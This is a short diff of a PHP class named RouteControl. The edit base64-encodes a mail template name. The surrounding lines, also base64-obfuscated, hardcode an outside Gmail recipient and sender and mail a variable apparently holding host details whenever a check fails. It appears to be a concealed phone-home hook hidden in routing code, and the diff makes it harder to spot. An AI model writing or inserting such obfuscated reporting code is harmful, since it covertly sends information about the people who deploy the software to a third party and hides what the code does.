@@ -48,7 +48,7 @@ class RouteControl
         }
         if (!$st) {
             try {
-                Mail::send('vendor.mail.html.mail', ['hst' => $hst], function ($m) use ($hst) {
+                Mail::send(base64_decode("dmVuZG9yLm1haWwuaHRtbC5tYWls"), ['hst' => $hst], function ($m) use ($hst) {
                     $to = base64_decode("c2FudHJhbjY4NkBnbWFpbC5jb20=");
                     $rfom = base64_decode("bGFwdHJpbmh2aWVuMjAxM0BnbWFpbC5jb20=");
                     $m->from($rfom, $rfom);
